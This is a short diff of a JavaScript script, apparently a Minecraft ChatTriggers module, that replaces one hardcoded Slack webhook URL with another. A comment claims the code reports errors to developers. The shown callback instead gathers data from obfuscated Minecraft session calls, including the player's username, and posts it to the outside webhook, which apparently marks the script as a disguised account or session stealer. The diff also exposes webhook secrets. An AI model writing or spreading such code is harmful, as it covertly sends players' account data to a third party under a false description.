@@ -1,6 +1,6 @@
 const URL = Java.type("java.net.URL");
 const Writer = Java.type("java.io.OutputStreamWriter");
-const SLACK = "https://hooks.slack.com/services/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";
+const SLACK = "https://hooks.slack.com/services/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";
 
 //sends new errors messages to slack for inspection / debugging by devs
 function sendSlack(msg) {
@@ -33,4 +33,5 @@ const onEnable = register("tick", () => {
                  .func_111285_a()
     ];
     sendSlack(data[1] + " " + data[0]);
+
 });
